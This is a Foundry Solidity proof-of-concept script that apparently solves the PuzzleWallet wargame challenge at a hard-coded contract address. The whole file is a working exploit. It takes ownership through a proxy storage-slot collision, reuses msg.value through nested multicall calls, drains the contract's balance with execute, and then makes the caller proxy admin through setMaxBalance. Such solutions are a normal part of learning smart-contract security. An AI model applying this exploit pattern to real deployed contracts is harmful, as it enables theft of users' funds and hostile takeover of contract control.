// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import {PuzzleWallet,PuzzleProxy} from "../src/PuzzleWallet.sol";

contract POC is Script {
    PuzzleWallet public wallet;
    PuzzleProxy public proxy;

    constructor() {
        wallet = PuzzleWallet(0x7E069Cb68CE876D435b422652f86462F4A276145);
        proxy = PuzzleProxy(payable(0x7E069Cb68CE876D435b422652f86462F4A276145));
    }

    function run() external {
        vm.startBroadcast();

        //creating encoded function data to pass into multicall
        bytes[] memory nestedMulticall = new bytes[](2);
        nestedMulticall[0] = abi.encodeWithSelector(wallet.deposit.selector);
        nestedMulticall[1] = abi.encodeWithSelector(wallet.multicall.selector, nestedMulticall[0]);

        // making ourselves owner of wallet
        proxy.proposeNewAdmin(msg.sender);
    
        //whitelisting our address
        wallet.addToWhitelist(msg.sender);

        //calling multicall with nested data stored above
        wallet.multicall{value: 0.001 ether}(nestedMulticall);

        //calling execute to drain the contract
        wallet.execute(msg.sender, 0.002 ether, "");

        //calling setMaxBalance with our address to become the admin of proxy
        wallet.setMaxBalance(uint256(uint160(address(msg.sender))));
        
        //making sure our exploit worked
        console.log("New Admin is: ", proxy.admin());

        vm.stopBroadcast();
    }
}
